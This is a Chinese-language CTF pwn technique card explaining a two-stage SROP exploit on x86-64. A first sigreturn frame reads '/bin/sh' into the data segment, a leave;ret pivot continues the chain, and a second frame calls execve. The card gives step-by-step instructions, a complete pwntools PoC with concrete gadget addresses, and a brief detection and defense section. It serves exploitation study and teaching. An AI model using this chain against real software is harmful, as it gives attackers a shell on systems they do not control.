---
id: binary-pwn-stack-two-stage-srop-read-data-leave-ret-execve
title: 无栈泄漏两段 SROP：首次 sigreturn 用 read 把 /bin/sh 写入 data 段，借 leave;ret 续链再 execve
type: scenario
domain: binary
path: binary/pwn/stack
technique: two-stage-srop-read-data-segment-leave-pivot-execve
aliases:
- SROP 链构造
- 连续 rt_sigreturn
- rootersctf_2019_srop
- pop rax syscall 触发 sigreturn
- 无栈地址泄漏 SROP
- frame.rbp 控制 leave;ret
tags:
- binary
- pwn
- srop
- sigreturn
- execve
- syscall-chain
- stack-overflow
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V688
  verified_at: '2026-11-13T16:04:22+08:00'
  notes: 已对照原文与20张图核对：0x88填充、pop rax;syscall(0x401032)、第一帧(read rax=0/rsi=0x402000/rdx=0x1000/rbp=0x402020)、syscall@0x401033 后 0x401035 leave 的续链布局、第二帧 execve 均与原文exp及截图一致；未验证点：未本机复跑PoC，续链依赖目标函数尾声形态（图13显示0x401035为leave；图15为成功flag）
---

## 一句话结论

当栈溢出能控制返回地址、但程序只回显固定全局缓冲区导致无法泄漏栈地址时，可以构造两段 SROP：第一份 frame 让 `rt_sigreturn` 恢复后执行一次 `read(0, data_seg, 0x1000)`，把 `/bin/sh` 与第二段 payload `read` 进已知的 data 段，并把 `frame.rbp` 设为 `data_seg+0x20`，使 syscall 之后函数尾声的 `leave; ret` 把 `rsp` 迁移到刚写入的数据上；随后用 `pop rax; syscall` gadget 把 `rax` 置 15 二次触发 `rt_sigreturn`，第二份 frame 用 data 段中的 `/bin/sh` 完成 `execve("/bin/sh", 0, 0)`。

## 原理

- **SROP 基础**：Linux 处理信号时由内核在用户栈上保存 `ucontext`（全部寄存器）；handler 返回执行 `rt_sigreturn`（x86-64 系统调用号 15）时，内核完全信任这块用户可写内存并按它恢复寄存器。控制栈并令 `rax=15` 后执行 `syscall`，即可一次性设定 `rax/rdi/rsi/rdx/rip/rbp` 等全部寄存器，不需要任何 `pop rdi; ret` 类 gadget。
- **核心矛盾：没有栈地址**：单帧 SROP 的 `/bin/sh` 通常放在栈上，需要先泄漏栈地址；本题程序的 `write` 只回显固定全局缓冲区（不是刚读入的栈缓冲区），拿不到栈地址。解决办法是让第一次 sigreturn 的“返回值”落到一个已知的固定地址——设置 `frame.rax=0 (read)`、`frame.rsi=data_seg`、`frame.rdx=0x1000`、`frame.rip=syscall 指令`，sigreturn 后就执行 `read(0, data_seg, 0x1000)`，把第二段 payload 写进 data 段。`rdx` 必须足够大，否则第二段写不全、链在 data 段中断。
- **第一帧如何续到第二帧（关键细节）**：本题 `syscall` 指令（0x401033）后面紧跟函数尾声 `leave; ret`（0x401035）。`leave` 的语义是 `mov rsp, rbp; pop rbp`，用的是**寄存器 rbp**，而第一帧恰好可以把 `rbp` 恢复成任意值。把 `frame.rbp` 设为 `data_seg+0x20`，read 返回后 `leave` 就把 `rsp` 拨到 data 段：`pop rbp` 吃掉 `data_seg+0x20` 处 8 字节填充，`ret` 从 `data_seg+0x28` 取出下一段入口。因此第二段 payload 布局为 `"/bin/sh\0"` 补齐到 0x20、再 8 字节填充、0x28 处放 `pop rax; ...` 入口。
- **第二次触发 sigreturn**：第二段入口选 `pop rax` 后紧跟 `syscall` 的 gadget（原文 0x401032 处 `pop rax; syscall`），其后再放 `p64(15)`，即 `pop rax` 取 15 后直接 `syscall` 触发 `rt_sigreturn`，内核从 `rsp` 指向的第二份 frame 恢复寄存器。这里不依赖 read 返回值凑 15，因此不受 read 实际读入字节数影响。
- **收尾**：第二份 frame 设 `rax=59 (execve)`、`rdi=data_seg`（`/bin/sh` 所在处）、`rsi=0`、`rdx=0`、`rip=syscall 指令`，sigreturn 恢复后执行 `execve("/bin/sh", NULL, NULL)`。`execve` 不返回，第二帧的 `rsp` 可保持默认 0。
- **与单帧 SROP 的区别**：单帧依赖“栈上已有 /bin/sh 且知道其地址”；本链用第一帧的 `read` 主动把字符串落到固定段，并用 `frame.rbp` 与目标函数的 `leave; ret` 完成“syscall 返回即续链”，等价于把一次 SROP 扩成可任意拼接的系统调用链。若目标函数尾声不是 `leave; ret`，需要把 `frame.rbp` 改为与该尾声匹配的取值（例如 `pop rsp` gadget 或直接令 `frame.rsp` 指向下一段）。

## 触发条件

- x86-64 ELF，存在栈溢出可覆盖返回地址（原文填充到返回地址为 0x88 字节），且可注入长度足够容纳一份 frame（约 0xF8 字节）。
- 程序内有 `syscall` 指令且其后紧跟可预测的尾声（原文 `syscall` 后是 `leave; ret`），用于把 frame 中的 `rbp` 转化为栈迁移。
- 有一个 `pop rax; syscall`（或 `pop rax; ret` + `syscall`）gadget，用于把 `rax` 置 15 再次触发 `rt_sigreturn`。
- 存在无 PIE 的固定可写段（.data/.bss）用于放 `/bin/sh` 与第二段 payload；无需栈地址泄漏。
- 没有 seccomp 拦截 `rt_sigreturn`/`read`/`execve`；NX 不影响 SROP。

## 利用步骤

1. checksec 确认 NX/无 PIE/无 canary；IDA 确认溢出偏移与 `syscall` 指令地址，注意 `syscall` 后面的尾声形态（`leave; ret`）。
2. 找 `pop rax; syscall` gadget（原文 0x401032）与 syscall 指令地址（0x401033，其后 0x401035 为 `leave`）。
3. 第一段 payload：填充到返回地址 + `pop_rax_syscall` + `p64(15)` + 第一份 frame（`rax=0, rdi=0, rsi=data_seg, rdx=0x1000, rbp=data_seg+0x20, rip=syscall 指令`）。
4. 程序进入 `read(0, data_seg, 0x1000)` 后发送第二段：`b"/bin/sh\0".ljust(0x28, b"A")`，其中偏移 0x20 的 8 字节是 `leave` 的 `pop rbp` 填充，偏移 0x28 放 `pop_rax_syscall` + `p64(15)` + 第二份 frame（`rax=59, rdi=data_seg, rsi=0, rdx=0, rip=syscall 指令`）。
5. `read` 返回后 `leave; ret` 把执行流接到第二段入口，`pop rax=15` 触发 `rt_sigreturn`，第二帧恢复后 `execve("/bin/sh",0,0)` 拿到 shell。
6. 失败排查：`rdx` 是否足够大、`frame.rbp` 与 `leave` 的落点是否错位 8 字节、目标函数尾声是否真的是 `leave; ret`。

## PoC

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = process('./pwn')

pop_rax_syscall = 0x401032   # pop rax; syscall; 后接函数尾声 leave;ret
syscall_insn    = 0x401033   # syscall 指令（0x401035 为 leave）
data_seg        = 0x402000   # 固定可写缓冲区

# 第一段：rt_sigreturn 后执行 read(0, data_seg, 0x1000)，frame.rbp 控制后续 leave
frame = SigreturnFrame()
frame.rax = 0                # read
frame.rdi = 0
frame.rsi = data_seg
frame.rdx = 0x1000           # 必须足够大，保证第二段完整写入
frame.rbp = data_seg + 0x20  # leave: rsp=rbp，pop rbp 后 ret 取 data_seg+0x28
frame.rip = syscall_insn
io.sendafter(b'?', b'A' * 0x88 + p64(pop_rax_syscall) + p64(15) + bytes(frame))

# 第二段：/bin/sh + 填充 + pop rax;syscall + 15 + 第二帧 execve
frame = SigreturnFrame()
frame.rax = 59               # execve
frame.rdi = data_seg
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_insn
payload = b'/bin/sh\x00'.ljust(0x28, b'A')
payload += p64(pop_rax_syscall) + p64(15) + bytes(frame)
io.send(payload)
io.interactive()
```

## 变体与关联

- **置 rax=15 的方式**：除 `pop rax; syscall` gadget 外，也可用 `read` 恰好返回 15（见单帧 SROP 卡）或在 `pop rax; ret` 后再跳 `syscall`；本链选 gadget 的好处是不受 read 返回字节数约束。
- **尾声变体**：若 `syscall` 后不是 `leave; ret`，可直接在第一帧设置 `frame.rsp` 指向 data 段下一段入口（配合 `syscall; ret`），省去 rbp 配合；反之若目标是 `leave; ret` 且 rbp 不可控，则无法用本链。
- **对照**：单帧 `execve` 基础形态见 [[binary-pwn-stack-x64-srop-sigreturn-frame-execve]]；BSS 栈迁移串联三段 SROP ORW 见 [[binary-pwn-stack-short-overflow-bss-pivot-3stage-srop-orw-syscall-wrapper]]；signal handler 覆盖 rt_sigframe 的两阶段 ORW 见 [[ctf-pwn-signal-handler-rt-sigframe-srop-orw]]。
- **架构变体**：32 位使用 0x50 字节 frame 与 `int 0x80`，见 [[binary-pwn-stack-32bit-srop-read-return-sigreturn]]；MIPS 见 [[binary-pwn-stack-mips-srop-sigreturn-bss-execve]]。
- **受限**：有真实 canary/PIE 且无法泄漏、`syscall` 后尾声不可预测、data 段只读、或 seccomp 拦截 `rt_sigreturn` 时链不成立。

## 检测与防御

- **检测**：栈溢出 payload 中出现 `pop rax` gadget + 常量 15 + 长段 sigcontext 布局；`rt_sigreturn` 后立即出现指向固定 data/bss 段的 `read`，随后同一区域出现第二份 frame 并触发 `execve("/bin/sh")`；`rsp` 在 syscall 返回后突然指向 data 段（`leave` 迁移特征）。
- **防御**：栈 canary、PIE+ASLR、Full RELRO 提高地址定位成本；移除 `pop rax; syscall` 直连 gadget / 让 `syscall` 后不接 `ret`；seccomp 白名单过滤 `rt_sigreturn` 与 `execve`（注意正常信号处理也依赖 sigreturn，需评估）。
- **响应**：审计异常 `rt_sigreturn` 的 frame（`rax=59`、`rdi` 指向数据段、`rbp` 指向 bss/data）及随后的 `execve`。
